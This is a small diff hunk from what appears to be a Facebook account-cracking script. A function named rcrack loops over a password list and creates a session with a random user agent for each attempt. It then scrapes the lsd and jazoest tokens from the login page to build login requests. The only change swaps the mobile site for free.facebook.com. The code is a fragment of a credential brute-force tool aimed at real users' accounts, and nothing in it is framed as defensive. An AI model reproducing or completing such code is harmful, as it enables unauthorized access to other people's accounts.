@@ -340,7 +340,7 @@ def rcrack(uid,pwx,tl):
 		for ps in pwx:
 			session = requests.Session()
 			pro = random.choice(agents)
-			free_fb = session.get('https://m.facebook.com').text
+			free_fb = session.get('https://free.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
